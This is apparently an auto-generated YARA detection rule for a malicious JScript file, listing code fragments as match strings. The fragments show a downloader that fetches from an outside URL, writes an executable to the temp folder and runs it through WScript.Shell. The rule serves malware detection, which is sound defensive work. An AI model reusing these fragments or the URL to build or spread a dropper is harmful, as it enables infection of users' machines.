rule sig_20160330_aab9bb494eadde26ef9f6685e2141b3a {
  meta:
    description = "datamaliciousorder - file 20160330_aab9bb494eadde26ef9f6685e2141b3a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "19d7c93d686642174fe7cfe8fae64c4e7139f10eeb87054498f102937010474e"

  strings:
    $s1  = "E[XP](\"GET\", \"http://epegasus.pl/m2osa\", false);" fullword ascii
    $s2  = "var KW = function P() {return WScript[I](\"WScript\"+\".Shell\");}(), ED = 11;" fullword ascii
    $s3  = "function N(AW, IE){ZZ = ZZ * 1; return AW - IE;};" fullword ascii
    $s4  = "if (E[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function PX() {return KW[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"FGPXpwHANEtdkB9.ex\" + \"e\";};" fullword ascii
    $s6  = "function KR(){return XJ + \"\";};" fullword ascii
    $s7  = "function F(S){KW[\"Run\"](S, ZZ, ZZ);};" fullword ascii
    $s8  = "function R() {return ((A0 == true) && (A0 == M)) ? 1 : ZZ;};" fullword ascii
    $s9  = "}while (U);" fullword ascii
    $s10 = "function GS(){return 22;};" fullword ascii
    $s11 = "return N(GO, J);" fullword ascii
    $s12 = "function P0()" fullword ascii
    $s13 = "function AS(){return I;};" fullword ascii
    $s14 = "function B(DH) {var OO = (1, 2, 3, 4, 5, DH); return OO;};" fullword ascii
    $s15 = "var MR = new this[\"Date\"]();" fullword ascii
    $s16 = "var A0 = false;" fullword ascii
    $s17 = "A0 = true; " fullword ascii
    $s18 = "M = true; " fullword ascii
    $s19 = "var PS = false;" fullword ascii
    $s20 = "} catch(R0){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}